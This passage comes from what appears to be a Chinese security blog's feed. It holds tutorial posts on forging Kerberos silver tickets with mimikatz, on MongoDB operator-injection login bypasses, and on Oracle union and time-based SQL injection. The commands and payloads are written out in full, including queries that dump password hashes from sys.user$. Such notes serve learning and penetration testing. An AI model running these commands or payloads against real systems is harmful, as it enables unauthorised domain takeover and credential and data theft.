也就是白银票据.</p><p><strong>特点:</strong></p><ol><li>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主<br>体名称的服务帐户进行加密和签名。</li><li>白银票据是伪造TGS，这意味着白银票据仅限于特定服务器上的任何服务。</li><li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效<br>TGS可以完全伪造PAC</li><li>攻击者需要服务帐户的NTLM hash</li><li>TGS是伪造的，所以没有和TGT通信，意味着绕过DC的身份验证。</li><li>任何事件日志都在目标服务器上。</li></ol><p><strong>条件:</strong></p><ol><li>域名称</li><li>域的 SID 值</li><li>域的服务账户的密码HASH</li><li>伪造的用户名，可以是任意用户名，一般是伪造administrator</li><li>需要访问的服务</li></ol><p>伪造过程:</p><p>第一步：用域管理员账号登录主域控，使用 mimikatz.exe 执行命令抓取hash（在域控中执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ø 命令：</span><br><span class="line">• privilege::debug</span><br><span class="line">• sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>第二步：伪造票据。得到服务账户的 HASH 之后使用 mimikatz中的kerberos::golden功能生成白银票据TGS ticket。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:域名/sid:SID值 /target:目标主机/rc4:目标主机的HASH值（NTLM）/service:需要伪造</span><br><span class="line">的服务 /user:伪造的用户名 /ptt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">/domain：指定域名</span><br><span class="line">/sid：sid号（除最后一部分）</span><br><span class="line">/target：目标主机计算机名</span><br><span class="line">/rc4：目标主机的hash(NTLM)</span><br><span class="line">/service：需要伪造的服务</span><br><span class="line">/user：需要伪造的用户名</span><br><span class="line">/ppt：伪造了以后直接写入到内存中</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 第二步：伪造票据。其中：白银票据对应的服务列表</p><table><thead><tr><th>服务类型</th><th>白银票据对应的服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST/RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST/HOST</td></tr><tr><td>WinRM</td><td>HOST/HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP operations including Mimikatz DCSync</td><td>LDAP</td></tr><tr><td>Windows Remote Server Administration Tools</td><td>RPCSS/LDAP/CIFS</td></tr></tbody></table><p>第三步：利用伪造的白银票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir //dc.local\C$ </span><br></pre></td></tr></table></figure><p>生成白银票据后，再访问目标主机，无需输密码，访问成功</p><p>第三步：利用伪造的白银票据执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\dc.local cmd.exe</span><br></pre></td></tr></table></figure><p><strong>扩展:</strong></p><ul><li>白银票据的利用（扩展）：利用HOST服务修改和创建计划任务<br>需要导入一张 HOST Silver Ticket</li></ul><ol><li><p>创建 HOST Silver Ticket 银票</p></li><li><p>创建计划任务，创建完成后，查看是否添加成功。</p></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:域名/sid:SID /target:目标主机 /rc4:目标主机的hash值 /service:HOST /user:伪造的用户名 /ptt</span><br></pre></td></tr></table></figure><p>  • 注意：如果现实无法加载列资源，使用命令 chcp 437 修改为美国编码即可执行</p><ul><li>白银票据的利用（扩展）：使用WMI在目标系统上远程执行命令<br>• 需要导入两张Silver Ticket，一张 host Silver Ticket，一张 rpcss Silver Ticket</li></ul><ol><li><p>首先写入两个票据</p></li><li><p>执行wmic命令，在远程主机上创建新进程</p></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:域名/sid:SID /target:目标主机 /rc4:目标主机的hash值 /service:host /user:伪造的用户名 /ptt</span><br><span class="line">kerberos::golden /domain:域名 /sid: SID /target:目标主机 /rc4:目标主机的hash值 /service:rpcss /user:伪造的用户名 /ptt</span><br></pre></td></tr></table></figure><h2 id="黄金票据与白银票据的区别"><a href="#黄金票据与白银票据的区别" class="headerlink" title="黄金票据与白银票据的区别"></a>黄金票据与白银票据的区别</h2><ol><li><strong>访问权限不同：</strong><br>• 黄金票据：伪造TGT，可以获取任何Kerberos服务权限<br>• 白银票据：伪造TGS，只能访问指定的服务</li><li><strong>加密方式不同：</strong><br>• 黄金票据：由Kerberos的Hash加密<br>• 白银票据：由服务账号（通常为计算机账户）Hash加密</li><li><strong>认证流程不同：</strong><br>• 黄金票据：黄金票据的利用过程需要访问域控<br>• 白银票据：不需要认证，可以跳过KDC的认证</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;NTLM协议&quot;&gt;&lt;a href=&quot;#NTLM协议&quot; class=&quot;headerlink&quot; title=&quot;NTLM协议&quot;&gt;&lt;/a&gt;NTLM协议&lt;/h2&gt;&lt;p&gt;NTLM认证机制在工作组环境下和在域环境下是不同的, 域环境下有两套认证体系,默认使用Kerberos,当k</summary>
      
    
    
    
    
    <category term="内网" scheme="https://bstark.me/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://bstark.me/posts/2/"/>
    <id>https://bstark.me/posts/2/</id>
    <published>2022-01-23T14:22:33.000Z</published>
    <updated>2022-04-01T06:44:49.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mongodb-基础"><a href="#mongodb-基础" class="headerlink" title="mongodb 基础"></a>mongodb 基础</h2><p><strong>mongodb 概念</strong></p><table><thead><tr><th>SQL语句</th><th>Mongodb语句</th><th>说明</th></tr></thead><tbody><tr><td>database</td><td>database</td><td>数据库</td></tr><tr><td>table</td><td>collection</td><td>数据库表/集合</td></tr><tr><td>row</td><td>document</td><td>数据记录/文档</td></tr><tr><td>column</td><td>field</td><td>数据字段/域</td></tr><tr><td>index</td><td>index</td><td>索引</td></tr><tr><td>primary key</td><td>primary key</td><td>主键</td></tr></tbody></table><p><strong>MongoDB的基本操作</strong></p><ul><li><p><strong>MongoDB的启动</strong><br>• 开启服务：sudo mongod<br>• 登陆mongodb数据库：mongo –host 127.0.0.1</p></li><li><p><strong>数据库的操作</strong><br>• 查看所有的数据库：show dbs<br>• 切换数据库： use 数据库名<br>• 查看集合：show collections<br>• 数据库的创建：use 数据库名。有值自动创建，当use的时候，系统就会自动创建一个数据库。<br>• 删除数据库：进入数据库后db.dropDatabase(); 注意：如果没有选择任何数据库，会删除默认的test数据库</p></li><li><p><strong>集合的操作</strong><br>• 查看集合：show collections<br>• 创建集合：db.createCollection(“xxx”)<br>• 删除集合：db.xxx.drop()</p></li><li><p><strong>增</strong></p></li></ul><p>增加数据：db.xx.insert({key:value}) </p><p>举例：db.ichunqiu.insert({_id:1,name:”web”,age:10})</p><ul><li><p><strong>删</strong><br>① 全部删除：db.xx.remove({ })<br>② 根据条件删除，默认是删除所有符合条件的数据：db.xx.remove({age:10})<br>③ 只删除符合条件的第一个：db.xx.remove({gender:true},{justOne:true})</p></li><li><p><strong>改</strong><br>更改操作：db.xx.update({查找的条件}，{修改的内容})<br>① 修改内容：默认其他原有字段删除了，替换掉原有数据<br>db.xx.update({age:10},{name:”NoSQL ”})<br>② 保持原有的字段，加一个修饰$set：默认只修改第一个且对已存在的原有属性是替换，不存在的属性是添加<br>db.stu.update({age:10},{$set:{like:“study”}}) 说明：把like:”study”添加到数据里面，并不是替换</p></li><li><p><strong>查</strong></p></li></ul><p>基本查询：db.xx.find({查询条件})<br>① 查询所有的数据：db.xx.find() 或 db.xx.find({ })<br>② 默认查出所有符合条件的数据：db.xx.find({age:10})<br>③ 查找符合条件的第一个：db.xx.findOne({age:10})<br>④ 格式化输出——pretty()函数：db.xx.find({age:10}).pretty()</p><ul><li><strong>条件查询</strong></li></ul><table><thead><tr><th>缩写</th><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>$lt</td><td>&lt;</td><td></td></tr><tr><td>$lte</td><td>&lt;=</td><td></td></tr><tr><td>$gt</td><td>&gt;</td><td></td></tr><tr><td>$gte</td><td>&gt;=</td><td></td></tr><tr><td>$ne</td><td>!=</td><td></td></tr><tr><td>$in</td><td>in</td><td></td></tr><tr><td>$nin</td><td>not in</td><td></td></tr><tr><td>$all</td><td>all</td><td></td></tr><tr><td>$or</td><td>or</td><td></td></tr><tr><td>$not</td><td>not</td><td></td></tr><tr><td>$regex</td><td>正则</td><td></td></tr></tbody></table><p><strong>举例：</strong></p><p>db.xx.find({age:{$lt:20}}) 查询年龄小于20岁的<br>db.xx.find({age:{$ne:18}}) 查询年龄不等于18的<br>逻辑运算：$and，$or<br>① $and：默认的的查询条件就是且的关系<br><strong>举例：</strong></p><p>db.xx.find({age:28,gender:true})<br>db.xx.find({$and:[{age:28},{gender:true}]}) 查询年龄是28岁且性别为女<br>② $or：或的关系<br>举例：db.xx.find({$or:[{age:{$lt:30}},{gender:false}]}) 查询年龄小于30岁，或者性别为男</p><h2 id="mongodb-注入"><a href="#mongodb-注入" class="headerlink" title="mongodb 注入"></a>mongodb 注入</h2><p><strong>NOsql 注入种类:</strong></p><ol><li>重言式/永真式</li><li>JavaScript注入（拼接,难度较大）</li><li>联合查询注入（被淘汰）</li><li>mongo shell拼接注入（难度中等，危害大</li></ol><p><strong>永真注入</strong></p><p>Ø 什么是重言式注入？ • 重言式又称为永真式。此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。PHP的特性，是支持在GET和POST数据中传输数组。这个特性和MongoDB结合在一起，就会出现安全问题</p><p>正常的请求：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>login.php?username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span> </span><br></pre></td></tr></table></figure><p>MongoDB的查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$collection<span class="operator">-</span><span class="operator">&gt;</span>find(<span class="keyword">array</span>(&quot;username&quot; <span class="operator">=</span><span class="operator">&gt;</span> $_GET[<span class="string">&#x27; username &#x27;</span>], &quot;passwd&quot; <span class="operator">=</span><span class="operator">&gt;</span>$_GET[<span class="string">&#x27;passwd&#x27;</span>]));</span><br></pre></td></tr></table></figure><p> 构造特殊的请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login.php?username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><p>正则表达匹配:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>login.php?username[$regex]<span class="operator">=</span>.<span class="operator">*</span>?<span class="operator">&amp;</span>password[$regex]<span class="operator">=</span>.<span class="operator">*</span>? .<span class="operator">*</span>?为匹配所有字符串</span><br></pre></td></tr></table></figure><p><strong>原理:</strong></p><p>就PHP本身的性质而言，由于其松散的数组特性，导致如果我们输入value=1那么，也就是输入了一个value的值为1 的数据。如果输入value[$ne]=2也就意味着value=array($ne=&gt;2),在MongoDB的角度来，很有可能从原来的一个单个目标 的查询变成了条件查询</p><p> 从 <strong>xxx.find({‘key’: ‘A’})  ======&gt;&gt;&gt; xxx.find({‘key’:{$ne:’A’}})</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;mongodb-基础&quot;&gt;&lt;a href=&quot;#mongodb-基础&quot; class=&quot;headerlink&quot; title=&quot;mongodb 基础&quot;&gt;&lt;/a&gt;mongodb 基础&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;mongodb 概念&lt;/strong&gt;&lt;/p&gt;
&lt;table</summary>
      
    
    
    
    
    <category term="sql注入" scheme="https://bstark.me/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://bstark.me/posts/3/"/>
    <id>https://bstark.me/posts/3/</id>
    <published>2022-01-23T14:22:33.000Z</published>
    <updated>2022-04-01T06:45:38.725Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Oracle的基础操作"><a href="#Oracle的基础操作" class="headerlink" title="Oracle的基础操作"></a>Oracle的基础操作</h3><p><strong>基础语句</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Ø 创建表：</span><br><span class="line">• 语句： <span class="keyword">create</span> <span class="keyword">table</span> 表名(字段名称 类型 约束) • 举例： <span class="keyword">create</span> <span class="keyword">table</span> ichunqiu（name <span class="type">char</span>(<span class="number">10</span>) <span class="keyword">primary</span> key,age tinyint）</span><br><span class="line">Ø 增加列：</span><br><span class="line">• 语句：<span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span>(字段名称，数据类型) • 举例：<span class="keyword">alter</span> <span class="keyword">table</span> ichunqiu <span class="keyword">add</span>(class_name varchar2(<span class="number">200</span>))</span><br><span class="line">Ø 删除表中一列：</span><br><span class="line">• 语句：<span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">set</span> unused <span class="keyword">column</span> 列名</span><br><span class="line">• 举例：<span class="keyword">alter</span> <span class="keyword">table</span> ichunqiu <span class="keyword">set</span> unused <span class="keyword">column</span> name</span><br><span class="line">Ø 修改表字段：</span><br><span class="line">• 语句：<span class="keyword">alter</span> <span class="keyword">table</span> 表名 modify( 字段名称 新的字段类型 ) • 举例：<span class="keyword">alter</span> <span class="keyword">table</span> ichunqiu modify(name <span class="type">varchar</span>(<span class="number">200</span>))</span><br></pre></td></tr></table></figure><p><strong>权限分类</strong></p><p>• DBA：拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构<br>• RESOURCE：拥有Resource权限的用户只可以创建实体，不可以创建数据库结构<br>• CONNECT：拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构<br>• 对于普通用户：授予connect, resource权限<br>• 对于DBA管理用户：授予connect，resource, dba权限<br>• 所有用户都是public组</p><p><strong>权限控制</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• <span class="keyword">grant</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">to</span> userA; <span class="comment">--赋权给用户：userA</span></span><br><span class="line">• <span class="keyword">grant</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">to</span> public; <span class="comment">--赋权给所有用户</span></span><br><span class="line">• <span class="keyword">grant</span> <span class="keyword">select</span>, update <span class="keyword">on</span> product <span class="keyword">to</span> userA <span class="keyword">with</span> <span class="keyword">grant</span> option;<span class="comment">-- userA得到权限，并可以传递</span></span><br><span class="line">• <span class="keyword">revoke</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">from</span> userA; <span class="comment">--收回给予的权限从用户</span></span><br><span class="line">• userA <span class="keyword">revoke</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">from</span> public; <span class="comment">--收回给予的权限从所有用户</span></span><br></pre></td></tr></table></figure><h3 id="Oracle的系统表"><a href="#Oracle的系统表" class="headerlink" title="Oracle的系统表"></a>Oracle的系统表</h3><ul><li><strong>dba_tables</strong> : 系统里所有的表的信息，需要DBA权限才能查询</li><li><strong>all_tables : 当前用户有权限的表的信息</strong></li><li><strong>user_tables</strong>: 当前用户名下的表的信息</li><li><strong>all_tab_columns: 当前用户名下的所有字段名</strong></li><li><strong>DBA_ALL_TABLES</strong>：DBA 用户所拥有的或有访问权限的对象和表</li><li><strong>ALL_ALL_TABLES</strong>：某一用户拥有的或有访问权限的对象和表</li><li><strong>USER_ALL_TABLES</strong>：某一用户所拥有的对象和表</li></ul><p><code>user_tables</code> 的范围最小，<code>all_tables</code> 看到的东西稍多一些，而 <code>dba_tables</code> 的信息最全</p><p><strong>DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES</strong></p><p><strong>concat 只能拼字符串, ||拼列 查询</strong></p><p><strong>强类型转换的时候 数字型  可以使用ascii(substring(banner,1,2)) 转为数字型查询</strong></p><p><strong>跨库查询和mysql一样: SELECT * FROM TEST.ADMIN</strong></p><h3 id="数据库信息"><a href="#数据库信息" class="headerlink" title="数据库信息"></a>数据库信息</h3><p><strong>1.获取数据库版本：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">WHERE</span> rownum<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> version <span class="keyword">FROM</span> v$instance <span class="keyword">WHERE</span> rownum<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">具体注入的语句：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>oracle?id<span class="operator">=</span><span class="number">99</span><span class="string">&#x27; union select 1,&#x27;</span>a<span class="string">&#x27;,(SELECT banner FROM v$version WHERE banner LIKE &#x27;</span>Oracle<span class="operator">%</span><span class="number">25</span><span class="string">&#x27;) from dual -- +</span></span><br></pre></td></tr></table></figure><p><strong>2.获取操作系统版本：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">where</span> banner <span class="keyword">like</span> <span class="string">&#x27;TNS%&#x27;</span>;</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>oracle?id<span class="operator">=</span><span class="number">99</span><span class="string">&#x27; union select 1,&#x27;</span>a<span class="string">&#x27;,(SELECT banner FROM v$version where banner like &#x27;</span>TNS<span class="operator">%</span><span class="number">25</span><span class="string">&#x27;) from dual -- +</span></span><br></pre></td></tr></table></figure><p><strong>3.获取当前用户权限的所有数据库：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> owner,table_name <span class="keyword">FROM</span> all_tables;</span><br></pre></td></tr></table></figure><p><strong>4.获取当前数据库：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> global_name <span class="keyword">FROM</span> global_name;</span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> v$database;</span><br><span class="line"><span class="keyword">SELECT</span> instance_name <span class="keyword">FROM</span> v$instance;</span><br><span class="line"><span class="keyword">SELECT</span> SYS.DATABASE_NAME <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure><p><strong>5.获取用户相关信息：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual;获取当前数据库用户</span><br><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username;列出所有用户</span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> sys.user$; — priv;列出所有用户</span><br><span class="line"></span><br><span class="line">列出密码哈希:</span><br><span class="line"><span class="keyword">SELECT</span> name, password, astatus <span class="keyword">FROM</span> sys.user$ — priv; <span class="operator">&lt;=</span> <span class="number">10</span>g(astatus能够在acct被锁定的状态下给你反馈)</span><br><span class="line"><span class="keyword">SELECT</span> name,spare4 <span class="keyword">FROM</span> sys.user$ — priv; <span class="number">11</span>g</span><br><span class="line"></span><br><span class="line">获取数据库所有用户:</span><br><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username;</span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> sys.user$; <span class="comment">-- priv;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> session_privs; 获取当前用户权限</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> dba_sys_privs <span class="comment">-- priv;  获取所有用户权限</span></span><br><span class="line"></span><br><span class="line">获取用户角色</span><br><span class="line"><span class="keyword">SELECT</span> GRANTEE, GRANTED_ROLE <span class="keyword">FROM</span> DBA_ROLE_PRIVS;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> grantee <span class="keyword">FROM</span> dba_sys_privs;</span><br><span class="line"></span><br><span class="line">获取所有数据库用户密码</span><br><span class="line"><span class="keyword">SELECT</span> name, password, astatus <span class="keyword">FROM</span> sys.user$; <span class="comment">-- priv, &lt;= 10g;</span></span><br><span class="line"><span class="keyword">SELECT</span> name, spare4 <span class="keyword">FROM</span> sys.user$; <span class="comment">-- priv, &gt;= 11g; </span></span><br><span class="line"></span><br><span class="line">列出DBA账户: #<span class="keyword">DISTINCT</span> 去重复函数</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> grantee <span class="keyword">FROM</span> dba_sys_privs <span class="keyword">WHERE</span> ADMIN_OPTION <span class="operator">=</span> ‘YES’; — priv;</span><br><span class="line"></span><br><span class="line">获取主机名和IP</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_name <span class="keyword">FROM</span> dual;</span><br><span class="line"><span class="keyword">SELECT</span> host_name <span class="keyword">FROM</span> v$instance;</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_address <span class="keyword">FROM</span> dual;  查IP</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_name(‘<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>’) <span class="keyword">FROM</span> dual;  查主机名称</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> V$DATAFILE;  获取DB文件路径</span><br></pre></td></tr></table></figure><p><strong>6.获取字段名和表名:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> all_tables; 获取表名</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns; 获取字段名</span><br></pre></td></tr></table></figure><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><strong>1.判断是否存在注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; &quot; and 1=1 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://172.16.12.2:81/orcl.php? id=1 and 1=dbms_pipe.receive_message(&#x27;</span>RDS<span class="string">&#x27;, 5)--  延时</span></span><br></pre></td></tr></table></figure><p><strong>注释符</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Oracle 单行 <span class="comment">-- 多行/**/</span></span><br><span class="line">Mssql 单行 <span class="comment">--空格多行/**/</span></span><br><span class="line">Mysql 单行 <span class="comment">--+/空格 #多行/**/</span></span><br></pre></td></tr></table></figure><p><strong>2.判断字段数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>3.联合查询找回显位</strong><br>Oracle 数据库查询需要 from dual (虚表/伪表) 专为查询语句设置的表 union select * from dual–</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual<span class="comment">--   #null代替所有类型</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>4.查询数据库版本</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>5.查询数据库连接用户</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">-- #test</span></span><br></pre></td></tr></table></figure><p><strong>6.当前实例名</strong></p><figure 